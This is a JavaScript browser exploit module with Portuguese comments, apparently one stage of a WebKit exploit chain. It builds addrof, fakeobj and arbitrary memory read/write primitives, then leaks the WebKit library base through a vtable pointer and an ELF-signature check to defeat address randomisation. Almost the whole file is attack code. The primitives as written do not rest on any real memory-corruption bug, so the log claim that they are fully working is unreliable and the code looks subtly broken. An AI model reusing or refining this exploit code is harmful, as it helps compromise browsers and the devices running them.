// js/script3/testArrayBufferVictimCrash.mjs (v111 - Foco no Vazamento da Base)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Removida toda a lógica de preparação de ROP para focar exclusivamente
// em um vazamento estável e verificado da base do WebKit.
// Corrigido o bug na criação da máscara de alinhamento.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Final_v111_WebKitLeak_Focus";

// --- Funções de Conversão (Inalteradas) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO DE TESTE: VAZAMENTO DA BASE DO WEBKIT (CORRIGIDA E AUTOCONTIDA)
// =======================================================================================
async function runWebKitBaseLeakTest(addrof, arb_read) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        const location_obj = document.location;
        logS3(`Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);

        const location_addr = addrof(location_obj);
        logS3(`Endereço do objeto JSLocation: ${location_addr.toString(true)}`, "leak", FNAME_LEAK_TEST);

        const vtable_ptr = arb_read(location_addr);
        logS3(`Ponteiro da Vtable vazado: ${vtable_ptr.toString(true)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. Não é possível continuar.");
        }

        // CORREÇÃO: Cria a máscara de alinhamento diretamente.
        // A máscara 0xFFFFFFFFFFFFC000 alinha o endereço para baixo em um múltiplo de 0x4000.
        const ALIGNMENT_MASK = new AdvancedInt64(0xFFFFC000, 0xFFFFFFFF);
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`Candidato a endereço base do WebKit (alinhado): ${webkit_base_candidate.toString(true)}`, "leak", FNAME_LEAK_TEST);

        const elf_magic_full = arb_read(webkit_base_candidate);
        const elf_magic_low = elf_magic_full.low();
        
        logS3(`Assinatura lida do endereço base: 0x${elf_magic_low.toString(16)}`, "leak", FNAME_LEAK_TEST);
        if (elf_magic_low === 0x464C457F) { // 0x7F + 'E' + 'L' + 'F'
            logS3(`SUCESSO DE VAZAMENTO! Assinatura ELF encontrada. A base do WebKit é muito provavelmente ${webkit_base_candidate.toString(true)}`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error("Assinatura ELF não encontrada. O endereço base vazado pode estar incorreto.");
        }

    } catch(e) {
        logS3(`Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (FOCADA E CORRIGIDA)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");

    let final_result; // Declarada no escopo correto

    try {
        // --- Fases 1, 2, 3: Configuração das primitivas (sem alterações) ---
        logS3("--- FASE 1-3: Configurando e construindo primitivas... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET);
        };
        const fakeobj = (addr) => {
            vulnerable_slot[0] = int64ToDouble(new AdvancedInt64(addr).add(NAN_BOXING_OFFSET));
            return vulnerable_slot[0];
        };
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de L/E e Addrof estão operacionais.", "good");

        // --- FASE 4: Verificação de L/E ---
        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
        const test_obj = { a: 1.1 };
        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = test_obj_addr.add(0x10);
        arb_write_final(prop_a_addr, value_to_write);
        const value_read = arb_read_final(prop_a_addr);

        if (!value_read.equals(value_to_write)) {
            throw new Error("A verificação de L/E falhou.");
        }
        logS3("++++++++++++ SUCESSO L/E! As primitivas são 100% funcionais. ++++++++++++", "vuln");

        // --- FASE 5: VAZAMENTO DA BASE DO WEBKIT ---
        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read_final);
        
        final_result = {
            success: leak_result.success,
            message: `L/E funcional. Vazamento da base do WebKit: ${leak_result.success ? `SUCESSO. Base: ${leak_result.webkit_base}` : "FALHA."}`
        };

    } catch (e) {
        final_result = {
            success: false,
            message: `ERRO CRÍTICO NO TESTE: ${e.message}`
        };
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
